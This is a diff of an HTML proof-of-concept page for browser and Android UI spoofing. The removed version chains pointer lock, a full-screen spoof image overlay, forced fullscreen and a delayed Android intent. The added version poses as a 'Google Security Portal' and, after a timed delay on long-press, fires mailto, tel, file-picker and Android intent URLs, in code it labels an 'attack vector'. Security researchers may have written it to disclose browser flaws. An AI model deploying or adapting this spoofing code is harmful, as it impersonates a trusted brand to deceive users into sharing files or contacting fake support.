@@ -1,174 +1,199 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Chaining & Delayed Intent PoC</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Picker & Protocol Spoof PoC</title>
     <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        width: 100%;
-        background: #0b0e14;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: #f0f6fc;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
-      }
-      #fullscreenElement {
-        position: relative;
-        width: 100%;
-        height: 100%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
-      button {
-        width: 100%;
-        max-width: 360px;
-        padding: 18px 24px;
-        font-size: 16px;
-        font-weight: 600;
-        background: #da3633;
-        color: #fff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
-        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
-        transition: transform 0.1s, background 0.2s;
-      }
-      button:active { background: #b62324; transform: scale(0.98); }
-      .info {
-        margin-top: 20px;
-        font-size: 13px;
-        color: #8b949e;
-        font-family: monospace;
-        word-break: break-all;
-        padding: 0 10px;
-      }
-      #spoof {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        min-width: 100vw;
-        min-height: 100vh;
-        object-fit: cover;
-        z-index: 2147483647;
-        pointer-events: none;
-      }
-      #pointerLockElement {
-        width: 1px;
-        height: 1px;
-        position: absolute;
-        opacity: 0;
-      }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .banner {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 24px;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            width: 100%;
+            max-width: 340px;
+        }
+        a.spoof-link {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: white;
+            padding: 14px 28px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
+        }
+        a.spoof-link:active {
+            background-color: #1557b0;
+        }
+        .preview-container {
+            margin-top: 25px;
+            max-width: 280px;
+            display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
+        .file-info {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
+            word-break: break-all;
+        }
+        .footer-note {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #9aa0a6;
+        }
     </style>
-    <script>
-      addEventListener("touchstart", (event) => {});
-      window.ontouchstart = (event) => {
-        let input = document.getElementById("focusInput");
-        if (input) input.focus();
-      };
+</head>
+<body>
 
-      addEventListener("touchend", (event) => {});
-      window.ontouchend = (event) => {
-        let input = document.getElementById("focusInput");
-        if (input) input.blur();
-      };
-    </script>
-  </head>
-  <body>
-    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
+    <div class="banner">Google Security Portal</div>
+    <h1>Secure Document Verification</h1>
 
-    <div id="pointerLockElement"></div>
-
-    <div id="fullscreenElement">
-      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
-
-      <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE FULL CHAINING BYPASS</button>
-        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
-      </div>
+    <!-- Container dengan 4 Tombol Terpisah (Termasuk Android Intent) -->
+    <div class="button-container">
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
+    <!-- Uploaded Image Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
+    </div>
+
+    <div class="footer-note">Cloud-secured verification system.</div>
+
     <script>
-      let execButton = document.getElementById("execBtn");
-      let statusInfo = document.getElementById("statusInfo");
+        let triggered = false;
 
-      execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing chained security context bypass...";
-        this.style.display = "none";
+        const executeAttackVector = (actionType, intent) => {
+            if (triggered) return;
+            triggered = true;
 
-        try {
-          // 1. Chaining Step 1: Pointer Lock Activation
-          let plElement = document.getElementById("pointerLockElement");
-          if (plElement && plElement.requestPointerLock) {
-            await plElement.requestPointerLock().catch((err) => {
-              console.debug("PointerLock chained catch:", err.message);
-            });
-          }
+            // Timer optimized to match the preview page opening animation
+            setTimeout(async () => {
+                try {
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    const fileInfo = document.getElementById("fileInfo");
 
-          // 2. Chaining Step 2: Intent URI Dispatcher (geo: schema) untuk memicu dialog sistem
-          let spoofFrame = document.createElement("iframe");
-          spoofFrame.style.display = "none";
-          spoofFrame.src = "geo:0,0?q=apple.com";
-          document.body.appendChild(spoofFrame);
+                    if (actionType === 'mailto') {
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'filepicker') {
+                        // Menggunakan File System Access API
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
 
-          // 3. Chaining Step 3: Instan menampilkan visual overlay spoof.png di atas konteks dialog
-          let spoofImg = document.getElementById("spoof");
-          if (spoofImg) {
-            spoofImg.style.display = "block";
-          }
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
 
-          statusInfo.innerText = "Status: Overlay deployed. Engaging chained Fullscreen lock...";
+                        if (file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
+                        }
+                    }
+                    else if (actionType === 'intentspoof') {
+                        // Menggunakan parameter intent spesifik NDevTK
+                        const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                        window.location.href = intentUrl;
+                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
 
-          // 4. Chaining Step 4: Eksekusi Fullscreen secara bersamaan
-          let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
+                } catch (err) {
+                    console.debug("Handler cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
+                }
+            }, 2400); // 1.9 seconds delay for ephemeral tab
+        };
 
-          let requestFS = fsElement.requestFullscreen || 
-                          fsElement.webkitRequestFullscreen || 
-                          fsElement.mozRequestFullScreen || 
-                          fsElement.msRequestFullscreen;
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
+        });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
 
-          if (requestFS) {
-            try {
-              await requestFS.call(fsElement, { navigationUI: "hide" });
-            } catch (err) {
-              try {
-                await requestFS.call(fsElement);
-              } catch (e) {
-                console.debug("Fullscreen chain fallback error:", e.message);
-              }
-            }
-          }
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
 
-          let container = document.getElementById("mainContainer");
-          if (container) {
-            container.style.display = "none";
-          }
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("contextmenu", (e) => {
+            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        });
+        linkFile.addEventListener("touchstart", () => {}, { passive: true });
 
-          statusInfo.innerText = "Status: Full chaining active. Android intent will run last in 3 seconds...";
-
-          // 5. Eksekusi Android Intent NDevTK secara otomatis berjalan paling terakhir setelah 3 detik
-          setTimeout(() => {
-            statusInfo.innerText = "Status: Dispatching final Android intent payload...";
-            let intentFrame = document.createElement("iframe");
-            intentFrame.style.display = "none";
-            intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-            document.body.appendChild(intentFrame);
-          }, 3000);
-
-        } catch (err) {
-          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
-          execButton.style.display = "block";
-        }
-      };
+        // Event listener untuk Tombol Android Intent Spoof
+        const linkIntent = document.getElementById("targetLinkIntent");
+        linkIntent.addEventListener("contextmenu", (e) => {
+            executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent'));
+        });
+        linkIntent.addEventListener("touchstart", () => {}, { passive: true });
     </script>
-  </body>
+
+</body>
 </html>
